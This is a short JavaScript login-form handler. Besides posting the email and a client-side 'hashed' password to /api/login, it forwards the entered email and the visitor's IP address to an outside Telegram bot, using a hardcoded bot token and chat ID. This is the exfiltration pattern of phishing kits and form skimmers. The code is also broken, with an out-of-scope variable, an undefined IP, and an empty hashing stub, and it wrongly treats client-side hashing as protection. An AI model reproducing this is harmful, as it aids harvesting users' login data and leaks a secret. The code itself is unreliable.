$(function(){
    const form = document.getElementById('loginForm');

form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;   


  // **Important:** Hash the password before sending it to the server
  const hashedPassword = await hashPassword(password); // Implement a strong hashing algorithm

  // Send the hashed password and other relevant data to your server-side script
  const response = await fetch('/api/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ email, hashedPassword })
  });

  if (response.ok) {
    // Successful login, handle user authentication and redirect
    const data = await response.json();
    // ...
  } else {
    // Handle login failure, display error message to the user
    const error = await response.json();
    // ...
  }
});

// Implement a strong password hashing algorithm (e.g., bcrypt, Argon2)
async function hashPassword(password) {
  // ...
}
// Assuming you have a successful login and want to send a notification to your bot
const API_TOKEN = '8145966833:AAE8US49jHhfqjJvKCIs7svuHKC0v0P70jc';
const CHAT_ID = '6940980811';

const message = `New login attempt:
Email: ${email}
IP Address: ${userIP}`; // Get the user's IP address

fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);

});